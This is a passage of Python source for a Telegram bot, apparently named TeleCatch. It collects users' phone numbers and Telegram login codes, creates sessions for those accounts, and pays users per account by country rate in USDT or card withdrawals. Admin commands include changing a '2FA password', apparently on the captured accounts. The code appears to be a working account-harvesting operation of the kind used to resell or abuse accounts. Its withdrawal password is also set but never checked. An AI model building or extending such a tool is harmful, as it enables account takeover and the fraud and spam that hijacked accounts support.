    asyncio.set_event_loop(loop)
    try:
        return loop.run_until_complete(async_func)
    finally:
        loop.close()

# ==================== COMMAND HANDLERS ====================
@bot.message_handler(commands=['start', 'help'])
def handle_start(message):
    """Handle start and help commands"""
    user_id = message.from_user.id
    
    # Initialize user in database
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("""
        INSERT OR IGNORE INTO users (user_id, full_name, join_date) 
        VALUES (?, ?, ?)
    """, (user_id, message.from_user.first_name, datetime.datetime.now().isoformat()))
    conn.commit()
    conn.close()
    
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check channel membership
    if not check_channel_membership(user_id) and not is_admin(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    welcome_text = LanguageManager.get_text('welcome', language)
    bot.send_message(message.chat.id, welcome_text)

@bot.message_handler(commands=['phone'])
def handle_phone(message):
    """Handle phone number submission"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check channel membership
    if not check_channel_membership(user_id) and not is_admin(user_id):
        send_channel_join_message(message.chat.id)
        return
    
    user_data[user_id] = {'state': 'awaiting_phone'}
    bot.send_message(message.chat.id, LanguageManager.get_text('enter_phone', language))

@bot.message_handler(commands=['account'])
def handle_account(message):
    """Handle account balance check"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, verified_count, unverified_count, frozen_balance FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if result:
        balance, verified, pending, frozen_balance = result
        balance_text = LanguageManager.get_text('balance', language, 
                                              user_id=user_id, verified=verified, 
                                              pending=pending, balance=balance, frozen=frozen_balance)
        bot.send_message(message.chat.id, balance_text)
    else:
        bot.send_message(message.chat.id, "❌ Account not found")

@bot.message_handler(commands=['withdraw'])
def handle_withdraw(message):
    """Handle withdrawal options"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    # Check if withdraw is enabled
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT value FROM settings WHERE key = 'withdraw_status'")
    result = cursor.fetchone()
    conn.close()
    
    if result and result[0] == 'off':
        bot.send_message(message.chat.id, "❌ Withdrawals are currently disabled.")
        return
    
    # Check balance
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT balance, withdraw_password FROM users WHERE user_id = ?", (user_id,))
    result = cursor.fetchone()
    conn.close()
    
    if not result:
        bot.send_message(message.chat.id, "❌ Account not found.")
        return
    
    balance, has_password = result
    
    if balance < MIN_WITHDRAW:
        bot.send_message(message.chat.id, 
                        LanguageManager.get_text('withdraw_min', language, 
                                               min=MIN_WITHDRAW, balance=balance))
        return
    
    if not has_password:
        bot.send_message(message.chat.id, "🔐 Please set a withdrawal password first using /setpassword")
        return
    
    # Show withdrawal options
    options_text = LanguageManager.get_text('withdraw_method', language, balance=balance)
    options_text += "\n\n/withdraw_ld - LD Card withdrawal\n/withdraw_usdt - USDT (BEP20) withdrawal"
    bot.send_message(message.chat.id, options_text)

@bot.message_handler(commands=['withdraw_ld'])
def handle_withdraw_ld(message):
    """Handle LD card withdrawal"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_ld_info'}
    bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_ld', language))

@bot.message_handler(commands=['withdraw_usdt'])
def handle_withdraw_usdt(message):
    """Handle USDT withdrawal"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_usdt_address'}
    bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_usdt', language))

@bot.message_handler(commands=['capacity'])
def handle_capacity(message):
    """Show available countries and rates"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT country_code, country_name, rate, claim_time_seconds, capacity, usage_count FROM country_rates WHERE status = 'on'")
    countries = cursor.fetchall()
    conn.close()
    
    if not countries:
        bot.send_message(message.chat.id, "❌ No countries available at the moment.")
        return
    
    message_text = "🌍 Available Countries & Rates\n\n"
    for country in countries:
        code, name, rate, time, capacity, usage = country
        flag = get_country_flag(code)
        available = capacity - usage
        message_text += f"{flag} {name} ({code})\n"
        message_text += f"   💰 Rate: ${rate:.2f}\n"
        message_text += f"   ⏱️ Time: {time}s\n"
        message_text += f"   📊 Available: {available}/{capacity}\n\n"
    
    bot.send_message(message.chat.id, message_text)

@bot.message_handler(commands=['setpassword'])
def handle_set_password(message):
    """Handle password setup"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    user_data[user_id] = {'state': 'awaiting_password'}
    bot.send_message(message.chat.id, "🔐 Set withdrawal password:")

@bot.message_handler(commands=['language'])
def handle_language(message):
    """Handle language selection"""
    user_id = message.from_user.id
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        return
    
    bot.send_message(message.chat.id, "🌍 Choose language:\n/setlang_en - English\n/setlang_zh - Chinese\n/setlang_ar - Arabic")

@bot.message_handler(commands=['setlang_en', 'setlang_zh', 'setlang_ar'])
def handle_set_language(message):
    """Set user language"""
    user_id = message.from_user.id
    language_code = message.text.split('_')[1]
    
    LanguageManager.set_user_language(user_id, language_code)
    language_name = LANGUAGES.get(language_code, language_code)
    
    bot.send_message(message.chat.id, LanguageManager.get_text('language_set', 'en', language=language_name))

@bot.message_handler(commands=['cancel'])
def handle_cancel(message):
    """Cancel current operation"""
    user_id = message.from_user.id
    if user_id in user_data:
        del user_data[user_id]
        bot.send_message(message.chat.id, "✅ Current operation cancelled.")
    else:
        bot.send_message(message.chat.id, "❌ No active operation to cancel.")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['admin'])
def handle_admin(message):
    """Admin panel"""
    user_id = message.from_user.id
    
    if not is_admin(user_id):
        bot.send_message(message.chat.id, "❌ Access denied")
        return
    
    language = LanguageManager.get_user_language(user_id)
    admin_text = LanguageManager.get_text('admin_panel', language)
    admin_text += """

📊 Statistics & Management:
/admin_stats - View bot statistics
/admin_users - User management

❄️ Account Management:
/admin_freeze [user_id] [reason] - Freeze account
/admin_unfreeze [user_id] - Unfreeze account

🌍 Country Management:
/admin_countries - List all countries
/admin_add_country - Add new country
/admin_update_country - Update country
/admin_remove_country - Remove country

🔧 System Settings:
/admin_broadcast - Send broadcast
/admin_change_2fa - Change 2FA password
/admin_settings - System settings
"""
    
    bot.send_message(message.chat.id, admin_text)

@bot.message_handler(commands=['admin_stats'])
def handle_admin_stats(message):
    """Admin statistics"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    
    cursor.execute("SELECT COUNT(*) FROM users")
    total_users = cursor.fetchone()[0]
    
    cursor.execute("SELECT SUM(balance) FROM users")
    total_balance = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT SUM(frozen_balance) FROM users")
    total_frozen = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT SUM(verified_count) FROM users")
    total_sessions = cursor.fetchone()[0] or 0
    
    cursor.execute("SELECT COUNT(*) FROM users WHERE account_frozen = 1")
    frozen_accounts = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM country_rates")
    total_countries = cursor.fetchone()[0]
    
    cursor.execute("SELECT COUNT(*) FROM withdraw_history WHERE status = 'pending'")
    pending_withdrawals = cursor.fetchone()[0]
    
    conn.close()
    
    stats_text = f"""
📊 Admin Statistics

👥 Total Users: {total_users}
💰 Total Balance: ${total_balance:.2f}
❄️ Total Frozen: ${total_frozen:.2f}
✅ Total Sessions: {total_sessions}
🔒 Frozen Accounts: {frozen_accounts}
🌍 Total Countries: {total_countries}
⏳ Pending Withdrawals: {pending_withdrawals}
    """
    
    bot.send_message(message.chat.id, stats_text)

@bot.message_handler(commands=['admin_freeze'])
def handle_admin_freeze(message):
    """Freeze user account"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, "Usage: /admin_freeze user_id reason")
            return
        
        target_user = int(command_parts[1])
        reason = " ".join(command_parts[2:]) if len(command_parts) > 2 else "Administrative decision"
        
        freeze_account(target_user, reason)
        
        language = LanguageManager.get_user_language(message.from_user.id)
        bot.send_message(message.chat.id, LanguageManager.get_text('account_frozen_success', language, user_id=target_user, reason=reason))
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID")

@bot.message_handler(commands=['admin_unfreeze'])
def handle_admin_unfreeze(message):
    """Unfreeze user account"""
    if not is_admin(message.from_user.id):
        return
    
    try:
        command_parts = message.text.split()
        if len(command_parts) < 2:
            bot.send_message(message.chat.id, "Usage: /admin_unfreeze user_id")
            return
        
        target_user = int(command_parts[1])
        unfreeze_account(target_user)
        
        language = LanguageManager.get_user_language(message.from_user.id)
        bot.send_message(message.chat.id, LanguageManager.get_text('account_unfrozen_success', language, user_id=target_user))
        
    except ValueError:
        bot.send_message(message.chat.id, "❌ Invalid user ID")

@bot.message_handler(commands=['admin_countries'])
def handle_admin_countries(message):
    """List all countries with details"""
    if not is_admin(message.from_user.id):
        return
    
    conn = sqlite3.connect(DB_FILE, check_same_thread=False)
    cursor = conn.cursor()
    cursor.execute("SELECT * FROM country_rates")
    countries = cursor.fetchall()
    conn.close()
    
    if not countries:
        bot.send_message(message.chat.id, "❌ No countries in database.")
        return
    
    message_text = "🌍 All Countries in Database\n\n"
    for country in countries:
        code, name, rate, time, status, capacity, usage = country
        flag = get_country_flag(code)
        available = capacity - usage
        message_text += f"{flag} {name} ({code})\n"
        message_text += f"   💰 Rate: ${rate:.2f}\n"
        message_text += f"   ⏱️ Time: {time}s\n"
        message_text += f"   📊 Capacity: {available}/{capacity}\n"
        message_text += f"   🔧 Status: {status}\n"
        message_text += f"   👥 Usage: {usage}\n\n"
    
    bot.send_message(message.chat.id, message_text)

@bot.message_handler(commands=['admin_add_country'])
def handle_admin_add_country(message):
    """Add new country"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_add'}
    bot.send_message(message.chat.id, """
🌍 Add New Country

Please send country details in this format:
CountryCode CountryName Rate ClaimTime Capacity

Example:
BD Bangladesh 10.0 30 20
""")

@bot.message_handler(commands=['admin_update_country'])
def handle_admin_update_country(message):
    """Update country information"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_update'}
    bot.send_message(message.chat.id, """
🌍 Update Country

Please send update details in this format:
CountryCode Field NewValue

Available fields: rate, claim_time, status, capacity, name

Examples:
BD rate 15.0
US capacity 25
BD status off
""")

@bot.message_handler(commands=['admin_remove_country'])
def handle_admin_remove_country(message):
    """Remove country"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_country_remove'}
    bot.send_message(message.chat.id, "🌍 Remove Country\n\nSend country code to remove:")

@bot.message_handler(commands=['admin_broadcast'])
def handle_admin_broadcast(message):
    """Start broadcast process"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_broadcast'}
    bot.send_message(message.chat.id, "📢 Broadcast Message\n\nSend the message you want to broadcast to all users:")

@bot.message_handler(commands=['admin_change_2fa'])
def handle_admin_change_2fa(message):
    """Change 2FA password"""
    if not is_admin(message.from_user.id):
        return
    
    user_data[message.from_user.id] = {'state': 'awaiting_2fa_change'}
    bot.send_message(message.chat.id, "🔐 Change 2FA Password\n\nSend new 2FA password:")

# ==================== ADMIN MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: is_admin(message.from_user.id) and message.from_user.id in user_data)
def handle_admin_messages(message):
    """Handle admin state messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    language = LanguageManager.get_user_language(user_id)
    state = user_data[user_id].get('state')
    
    if state == 'awaiting_country_add':
        try:
            parts = text.split()
            if len(parts) < 5:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: CountryCode CountryName Rate ClaimTime Capacity")
                return
            
            country_code = parts[0].upper()
            country_name = parts[1]
            rate = float(parts[2])
            claim_time = int(parts[3])
            capacity = int(parts[4])
            
            if add_country(country_code, country_name, rate, claim_time, capacity):
                bot.send_message(message.chat.id, LanguageManager.get_text('country_added', language, country_code=country_code))
            else:
                bot.send_message(message.chat.id, "❌ Error adding country")
            
            del user_data[user_id]
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    
    elif state == 'awaiting_country_update':
        try:
            parts = text.split()
            if len(parts) < 3:
                bot.send_message(message.chat.id, "❌ Invalid format. Use: CountryCode Field NewValue")
                return
            
            country_code = parts[0].upper()
            field = parts[1].lower()
            new_value = parts[2]
            
            # Convert value based on field type
            if field in ['rate']:
                new_value = float(new_value)
            elif field in ['claim_time', 'capacity']:
                new_value = int(new_value)
            elif field == 'name':
                new_value = ' '.join(parts[2:])
            
            field_map = {
                'rate': 'rate',
                'claim_time': 'claim_time_seconds',
                'status': 'status',
                'capacity': 'capacity',
                'name': 'country_name'
            }
            
            if field not in field_map:
                bot.send_message(message.chat.id, "❌ Invalid field. Use: rate, claim_time, status, capacity, name")
                return
            
            if update_country(country_code, **{field_map[field]: new_value}):
                bot.send_message(message.chat.id, LanguageManager.get_text('country_updated', language, country_code=country_code))
            else:
                bot.send_message(message.chat.id, "❌ Error updating country")
            
            del user_data[user_id]
            
        except Exception as e:
            bot.send_message(message.chat.id, f"❌ Error: {str(e)}")
    
    elif state == 'awaiting_country_remove':
        country_code = text.upper()
        
        if remove_country(country_code):
            bot.send_message(message.chat.id, LanguageManager.get_text('country_removed', language, country_code=country_code))
        else:
            bot.send_message(message.chat.id, "❌ Error removing country")
        
        del user_data[user_id]
    
    elif state == 'awaiting_broadcast':
        admin_process_broadcast(message)
    
    elif state == 'awaiting_2fa_change':
        admin_process_change_2fa_password(message)

# ==================== MESSAGE HANDLER ====================
@bot.message_handler(func=lambda message: True)
def handle_all_messages(message):
    """Handle all text messages"""
    user_id = message.from_user.id
    text = message.text.strip()
    
    if user_id not in user_data:
        handle_start(message)
        return
    
    state = user_data[user_id].get('state')
    language = LanguageManager.get_user_language(user_id)
    
    # Check if account is frozen
    frozen, reason = is_account_frozen(user_id)
    if frozen:
        bot.send_message(message.chat.id, LanguageManager.get_text('frozen_account', language, reason=reason))
        del user_data[user_id]
        return
    
    if state == 'awaiting_phone':
        if re.match(r'^\+\d{10,15}$', text):
            processing_msg = bot.send_message(message.chat.id, "⏳ Processing your number...")
            run_async(send_verification_code(user_id, text, processing_msg.message_id))
        else:
            bot.send_message(message.chat.id, "❌ Invalid phone format. Use +1234567890")
    
    elif state == 'awaiting_code':
        if re.match(r'^\d{5}$', text):
            run_async(verify_code_and_create_session(user_id, text))
        else:
            bot.send_message(message.chat.id, LanguageManager.get_text('invalid_code', language))
    
    elif state == 'awaiting_password':
        if len(text) >= 4:
            if set_withdraw_password(user_id, text):
                bot.send_message(message.chat.id, LanguageManager.get_text('password_set', language))
            else:
                bot.send_message(message.chat.id, "❌ Error setting password")
        else:
            bot.send_message(message.chat.id, "❌ Password must be at least 4 characters")
        del user_data[user_id]
    
    elif state == 'awaiting_ld_info':
        # Process LD card withdrawal
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        
        if result:
            amount = result[0]
            cursor.execute("UPDATE users SET balance = 0 WHERE user_id = ?", (user_id,))
            cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, currency) VALUES (?, ?, ?, ?, ?)",
                         (user_id, amount, text, datetime.datetime.now().isoformat(), 'LD'))
            conn.commit()
            
            bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_success', language, amount=amount))
            
            # Notify admin group
            bot.send_message(WITHDRAW_GROUP_ID, f"🔄 New LD Withdrawal\nUser: {user_id}\nAmount: ${amount:.2f}\nDetails: {text}")
        conn.close()
        del user_data[user_id]
    
    elif state == 'awaiting_usdt_address':
        # Process USDT withdrawal
        conn = sqlite3.connect(DB_FILE, check_same_thread=False)
        cursor = conn.cursor()
        cursor.execute("SELECT balance FROM users WHERE user_id = ?", (user_id,))
        result = cursor.fetchone()
        
        if result:
            amount = result[0]
            cursor.execute("UPDATE users SET balance = 0 WHERE user_id = ?", (user_id,))
            cursor.execute("INSERT INTO withdraw_history (user_id, amount, address, timestamp, currency) VALUES (?, ?, ?, ?, ?)",
                         (user_id, amount, text, datetime.datetime.now().isoformat(), 'USDT'))
            conn.commit()
            
            bot.send_message(message.chat.id, LanguageManager.get_text('withdraw_success', language, amount=amount))
            
            # Notify admin group
            bot.send_message(WITHDRAW_GROUP_ID, f"🔄 New USDT Withdrawal\nUser: {user_id}\nAmount: ${amount:.2f}\nAddress: {text}")
        conn.close()
        del user_data[user_id]

# ==================== BOT STARTUP ====================
if __name__ == "__main__":
    logger.info("Starting TeleCatch Bot...")
    
    try:
        bot.infinity_polling(timeout=60, long_polling_timeout=60)
    except Exception as e:
        logger.error(f"Bot error: {e}")
